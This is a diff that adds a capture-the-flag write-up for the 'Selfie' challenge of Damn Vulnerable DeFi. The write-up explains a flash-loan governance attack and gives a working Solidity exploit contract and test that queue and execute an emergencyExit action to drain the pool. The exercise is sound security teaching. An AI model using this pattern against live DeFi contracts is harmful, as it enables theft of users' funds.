@@ -234,3 +234,65 @@ function test_theRewarder() public checkSolvedByPlayer {
 Run `forge test --mc TheRewarderChallenge` to validate test
 
 ---
+
+## 6.SELFIE
+
+### Objective
+
+_from `_isSolved()`in test_
+
+1. _Player has taken all tokens from the pool_
+
+### Attack Analysis
+
+- The vulnerability is associated with how the voting power should be accounted to prevent an attacker from queue actions while doing a flahs loan.
+- First, the attacker needs to ask a flash loan to `SelfiePool.flashLoan()` and receive the tokens in a contract implementing `IERC3156FlashBorrower`. To add an action in the queue, it's needed to have more than half of the supply of the `DamnValuableVotes` token. See `SimpleGovernance._hasEnoughVotes()`.
+- In `onFlashLoan()` of the attacker´s contract, they need to first delegate the votes using `DamnValuableVotes.delegate()` to have the tokens received accounting for voting power.
+- Then, in the same function, the attacker has to queue an action to call `SelfiePool.emergencyExit()` using the address of the `recovery`.
+- Finally, the attacker must wait for at least to days and call `SimpleGovernance.executeAction()`.
+
+### POC
+
+See [test/the-rewarder/Selfie.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/selfie/Selfie.t.sol)
+
+```solidity
+function test_selfie() public checkSolvedByPlayer {
+    bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
+
+    Attack attackContract = new Attack(address(pool), address(governance));
+    pool.flashLoan(IERC3156FlashBorrower(address(attackContract)), address(token), TOKENS_IN_POOL, data);
+
+    vm.warp(3 days);
+    governance.executeAction(1);
+
+    console.log(token.balanceOf(address(pool)));
+}
+
+contract Attack is IERC3156FlashBorrower {
+    SelfiePool private pool;
+    SimpleGovernance private governance;
+
+    constructor(address _pool, address _governance) {
+        pool = SelfiePool(_pool);
+        governance = SimpleGovernance(_governance);
+    }
+
+    function onFlashLoan(
+        address,
+        address token,
+        uint256 amount,
+        uint256,
+        bytes calldata data
+    ) external returns (bytes32) {
+        // voting logic)
+        DamnValuableVotes(token).delegate(address(this));
+
+        governance.queueAction(address(pool), 0, data);
+
+        DamnValuableVotes(token).approve(address(pool), amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+}
+```
+
+Run `forge test --mc SelfieChallenge` to validate test
